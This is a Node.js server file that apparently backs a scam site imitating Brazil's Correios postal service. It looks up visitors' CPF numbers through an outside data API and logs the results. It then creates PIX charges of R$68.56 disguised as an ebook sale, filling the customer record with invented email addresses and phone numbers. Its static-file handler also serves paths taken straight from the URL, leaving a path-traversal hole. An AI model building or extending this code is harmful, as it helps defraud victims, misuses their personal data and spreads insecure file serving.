const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 4002;

const MIME_TYPES = {
  '.html': 'text/html',
  '.css': 'text/css',
  '.js': 'text/javascript',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
};

const https = require('https');

const server = http.createServer((req, res) => {
  console.log(`[REQUEST] ${req.method} ${req.url}`);

  // Check Payment Status
  if (req.url.startsWith('/api/check-payment') && req.method === 'GET') {
    const urlParts = req.url.split('/');
    // Extract ID assuming format /api/check-payment/ID or query param ?id=ID
    // Let's support query param ?id=XXX for simplicity and consistency
    const queryId = req.url.split('id=')[1];

    if (!queryId) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Missing payment ID' }));
      return;
    }

    const options = {
      hostname: 'api.blackcatpagamentos.online',
      path: `/api/sales/${queryId}`,
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': process.env.BLACKCAT_API_KEY || 'YOUR_BLACKCAT_API_KEY_HERE'
      }
    };

    const apiReq = https.request(options, (apiRes) => {
      let apiData = '';
      apiRes.on('data', (chunk) => {
        apiData += chunk;
      });
      apiRes.on('end', () => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(apiData);
      });
    });

    apiReq.on('error', (e) => {
      console.error(e);
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Failed to contact payment gateway' }));
    });

    apiReq.end();
    return;
  }

  // Helpers for Data Generation
  function normalizeName(name) {
    return name.normalize("NFD").replace(/[\u0300-\u036f]/g, "").toLowerCase().replace(/[^a-z0-9]/g, "");
  }

  function generateRandomEmail(name) {
    const cleanName = normalizeName(name || "cliente");
    const suffix = Math.floor(Math.random() * 900000) + 100000; // 6 digits
    return `${cleanName}${suffix}@gmail.com`;
  }

  function generateRandomPhone() {
    const ddd = Math.floor(Math.random() * 90) + 10;
    const part1 = Math.floor(Math.random() * 90000) + 10000;
    const part2 = Math.floor(Math.random() * 9000) + 1000;
    return `${ddd}${part1}${part2}`;
  }

  // Handle API requests
  // Allow for potential slash differences or query params
  if (req.url.includes('/api/create-pix') && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', () => {
      try {
        const data = JSON.parse(body);

        // Data Generation
        const customerName = data.name || "Cliente Nao Informado";
        const generatedEmail = generateRandomEmail(customerName);
        const generatedPhone = generateRandomPhone();

        // Prepare payload for BlackCat
        const payload = JSON.stringify({
          amount: 6856, // Amount in cents (R$ 68,56)
          currency: "BRL",
          paymentMethod: "pix",
          items: [
            {
              title: "EBOOK SABOR ENERGETICO TOGURO",
              quantity: 1,
              tangible: false
            }
          ],
          customer: {
            name: customerName,
            email: generatedEmail,
            phone: generatedPhone,
            document: {
              number: data.cpf ? data.cpf.replace(/\D/g, '') : "00000000000",
              type: "cpf"
            }
          },
          pix: {
            expiresInDays: 1
          }
        });

        const options = {
          hostname: 'api.blackcatpagamentos.online',
          path: '/api/sales/create-sale',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-API-Key': process.env.BLACKCAT_API_KEY || 'YOUR_BLACKCAT_API_KEY_HERE'
          }
        };

        const apiReq = https.request(options, (apiRes) => {
          let apiData = '';
          apiRes.on('data', (chunk) => {
            apiData += chunk;
          });
          apiRes.on('end', () => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(apiData);
          });
        });

        apiReq.on('error', (e) => {
          console.error(e);
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Failed to contact payment gateway' }));
        });

        apiReq.write(payload);
        apiReq.end();

      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Invalid JSON' }));
      }
    });
    return;
  }

  let filePath = './public' + decodeURIComponent(req.url.split('?')[0]);
  // Dtrack API Proxy
  if (req.url.includes('/api/consult-cpf') && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', () => {
      try {
        const { cpf } = JSON.parse(body);
        const cleanCpf = cpf.replace(/\D/g, '');
        const token = process.env.LEGENDARY_API_TOKEN || 'YOUR_LEGENDARY_API_TOKEN_HERE';

        console.log(`[API] Consultando CPF: ${cleanCpf}`);

        const options = {
          hostname: 'legendaryapi.online',
          path: `/${token}/${cleanCpf}`,
          method: 'GET',
          headers: {
            'Accept': 'application/json'
          }
        };

        const apiReq = https.request(options, (apiRes) => {
          let data = '';
          apiRes.on('data', (chunk) => {
            data += chunk;
          });
          apiRes.on('end', () => {
            console.log(`[API] Status: ${apiRes.statusCode}`);
            console.log(`[API] Response: ${data}`);

            res.writeHead(apiRes.statusCode, { 'Content-Type': 'application/json' });
            res.end(data);
          });
        });

        apiReq.on('error', (e) => {
          console.error(`[API] Erro de conexão: ${e.message}`);
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Erro ao conectar com a API externa' }));
        });

        apiReq.end();
      } catch (e) {
        console.error('[API] Erro no parse da requisição:', e);
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Invalid JSON' }));
      }
    });
    return;
  }

  if (filePath === './public/') {
    const query = req.url.includes('?') ? '?' + req.url.split('?')[1] : '';
    res.writeHead(302, { 'Location': '/correios/index.html' + query });
    res.end();
    return;
  }

  const extname = path.extname(filePath);
  let contentType = MIME_TYPES[extname] || 'application/octet-stream';

  fs.readFile(filePath, (error, content) => {
    if (error) {
      if (error.code === 'ENOENT') {
        fs.readFile('./404.html', (error, content) => {
          if (error) {
            // If 404.html doesn't exist, just send text
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('404 Not Found', 'utf-8');
          } else {
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end(content, 'utf-8');
          }
        });
      } else {
        res.writeHead(500);
        res.end('Sorry, check with the site admin for error: ' + error.code + ' ..\n');
      }
    } else {
      res.writeHead(200, { 'Content-Type': contentType });
      res.end(content, 'utf-8');
    }
  });
});

server.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}/`);
});
